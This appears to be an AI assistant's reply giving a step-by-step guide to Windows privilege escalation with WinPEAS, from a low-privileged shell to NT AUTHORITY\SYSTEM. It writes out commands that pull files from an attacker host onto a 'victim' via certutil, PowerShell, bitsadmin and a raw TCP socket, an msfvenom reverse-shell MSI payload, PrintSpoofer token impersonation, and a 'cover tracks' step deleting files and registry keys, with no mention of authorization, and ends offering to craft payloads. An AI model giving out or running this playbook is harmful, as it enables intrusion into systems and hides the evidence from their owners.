Hereâ€™s the **complete step-by-step guide for using WinPEAS** â€” from downloading to achieving privilege escalation â€” just like the linPEAS walkthrough. This is tailored for **Windows targets** where you have a low-privileged shell or reverse shell and want to escalate to **NT AUTHORITY\SYSTEM**.

---

## âœ… REALISTIC STEPS TO USE **WINPEAS** AND ESCALATE TO SYSTEM

---

### ðŸ§° Prerequisites:

* Access to a Windows target (via reverse shell, RDP, or Meterpreter) **as a non-admin user**.
* A host machine (attacker box) to serve files (Kali, Windows, etc.).
* One or more tools available: `certutil`, `powershell`, `wget`, `curl`, or `nc`.

---

## ðŸªœ STEP-BY-STEP GUIDE

---

### ðŸ”¹ Step 1: **Download WinPEAS on Attacker Box**

On your Kali/Windows attack box:

```bash
# Download winpeasx64.exe (most common case)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
```

Other versions:

* `winPEAS.bat` â†’ for legacy Windows
* `winPEASx86.exe` â†’ for 32-bit systems

---

### ðŸ”¹ Step 2: **Host the File (HTTP Server)**

On Kali:

```bash
python3 -m http.server 80
```

On Windows (PowerShell):

```powershell
Start-WebServer -Port 80
```

---

### ðŸ”¹ Step 3: **Transfer WinPEAS to Victim**

Choose a method **based on what the victim supports**:

---

#### âœ… Option A: `certutil` (most common on Windows)

```powershell
certutil -urlcache -split -f http://<attacker-ip>/winPEASx64.exe winpeas.exe
```

---

#### âœ… Option B: `powershell Invoke-WebRequest`

```powershell
powershell -c "Invoke-WebRequest -Uri http://<attacker-ip>/winPEASx64.exe -OutFile winpeas.exe"
```

---

#### âœ… Option C: `bitsadmin` (older systems)

```cmd
bitsadmin /transfer download http://<attacker-ip>/winPEASx64.exe C:\Users\Public\winpeas.exe
```

---

#### âœ… Option D: `wget` or `curl` (if available)

```cmd
wget http://<attacker-ip>/winPEASx64.exe
curl -O http://<attacker-ip>/winPEASx64.exe
```

---

#### âœ… Option E: Via `nc` (netcat)

On attacker:

```bash
nc -lvnp 9001 < winPEASx64.exe
```

On target:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("<attacker-ip>",9001); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; $i=0; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); Add-Content winpeas.exe $data }
```

---

### ðŸ”¹ Step 4: **Execute WinPEAS**

From CMD or PowerShell on the victim:

```powershell
.\winpeas.exe
```

Or to redirect output:

```powershell
.\winpeas.exe > C:\Users\Public\peasout.txt
```

---

### ðŸ”¹ Step 5: **Analyze WinPEAS Output**

Look for **Privilege Escalation Vectors**:

| Section                  | What to Look For                  |
| ------------------------ | --------------------------------- |
| Services with weak perms | Can you change/start a service?   |
| AlwaysInstallElevated    | `HKLM` and `HKCU` both = 1?       |
| Unquoted service paths   | Path has spaces, no quotes?       |
| Scheduled tasks          | Writable scripts or binaries?     |
| Auto-logon credentials   | Saved passwords in registry?      |
| Token impersonation      | SeImpersonatePrivilege = Enabled? |
| DLL Hijacking paths      | Writable folders in PATHs?        |
| Outdated software        | Known vulnerabilities in version? |
| Credential Files         | Saved WiFi, mRemoteNG, passwords? |

---

### ðŸ”¹ Step 6: **Exploit the Vulnerability**

Examples:

#### ðŸ”¸ AlwaysInstallElevated

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 -f msi > shell.msi
```

On victim:

```powershell
msiexec /quiet /qn /i C:\Users\Public\shell.msi
```

---

#### ðŸ”¸ Weak service permissions

Replace binary or change config via `sc.exe`, restart service to get SYSTEM shell.

---

#### ðŸ”¸ Token Impersonation (via `JuicyPotato`, `PrintSpoofer`, or `Potato` variants)

If you have:

```bash
[+] SeImpersonatePrivilege = Enabled
```

You may run:

```powershell
.\PrintSpoofer.exe -i -c cmd
```

---

### ðŸ”¹ Step 7: **Confirm SYSTEM Access**

```cmd
whoami
```

Expect:

```
nt authority\system
```

âœ… Youâ€™ve escalated privileges!

---

### ðŸ”¹ Step 8: (Optional) **Cover Tracks**

```powershell
del winpeas.exe
del shell.msi
Remove-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Installer' -Recurse
```

---

## ðŸ§  Bonus: WinPEAS Versions

* `winPEASx64.exe` â€“ Recommended
* `winPEASx86.exe` â€“ For 32-bit
* `winPEAS.bat` â€“ For stealthier, legacy systems

---

## âœ… TL;DR â€“ Zero to SYSTEM via WinPEAS

1. Download `winPEASx64.exe`
2. Host via HTTP server
3. Transfer to victim using `certutil`, PowerShell, etc.
4. Run `winpeas.exe`
5. Analyze for `AlwaysInstallElevated`, weak services, tokens, etc.
6. Exploit and become `NT AUTHORITY\SYSTEM`

---

Let me know if you're stuck at a particular step or want help crafting a payload for the vulnerability you find!
